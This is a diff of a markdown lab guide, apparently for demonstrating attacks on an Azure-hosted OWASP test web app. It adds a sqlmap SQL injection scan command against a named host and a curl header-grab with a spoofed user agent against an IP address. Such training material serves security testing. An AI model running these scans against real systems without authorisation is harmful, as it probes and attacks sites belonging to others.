@@ -22,3 +22,12 @@ This is instructions on how to execute a website attack. It was created by Andre
 ```
     sqlmap -u "https://owaspdirect-prunoavl6xr2y.azurewebsites.net" --data="id=1&str=val" -b 
 ```
+![image](https://user-images.githubusercontent.com/97529152/161347761-6c4a72d3-8c94-4d97-8c78-761c182a9f74.png)
+
+**NOTE:**  
+This will NOT be successful but will send a lot of SQL injection and XSS traffic to the WebApp. This will identity that there are NO DBs behind the WebApp.
+
+- Grab header and spoof useragent 
+```
+curl -I -X HEAD -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" http://52.249.241.69
+```
